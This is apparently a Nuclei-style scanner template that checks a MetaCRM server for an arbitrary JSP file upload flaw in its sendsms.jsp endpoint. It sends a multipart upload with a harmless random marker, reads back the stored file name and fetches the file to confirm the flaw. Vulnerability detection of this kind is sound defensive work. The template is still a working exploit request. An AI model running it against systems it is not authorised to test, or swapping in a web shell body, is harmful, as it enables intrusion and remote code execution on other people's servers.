id: poc-yaml-metacrm-sendsms-jsp-anyfile-upload
info:
  name: MetaCRM sendsms.jsp Arbitrary File Upload Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  tags: file-upload
  description: |
    A critical arbitrary file upload vulnerability in MetaCRM's sendsms.jsp endpoint allows attackers to upload and execute arbitrary JSP files.

variables:
  t1: "{{rand_text_alphanumeric(4)}}"
  t2: "{{base64(t1)}}"

flow: |
  http(1) && http(2)

http:
  - id: upload-file
    method: POST
    path:
      - "{{BaseURL}}/business/common/sms/sendsms.jsp"
    headers:
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
    body: |-
      ------WebKitFormBoundaryFfJZ4PlAZBixjELj
      Content-Disposition: form-data; name="file"; filename="{{t1}}.jsp"
      Content-Type: image/jpeg

      {{t2}}
      ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "userfile"
          - ".jsp"
    extractors:
      - type: regex
        internal: true
        name: file
        part: body
        regex:
          - "(?P<file>[0-9a-z]{32}).jsp"

  - id: verify-file
    method: GET
    path:
      - "{{BaseURL}}/userfile/temp/{{file}}.jsp"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "{{t2}}"
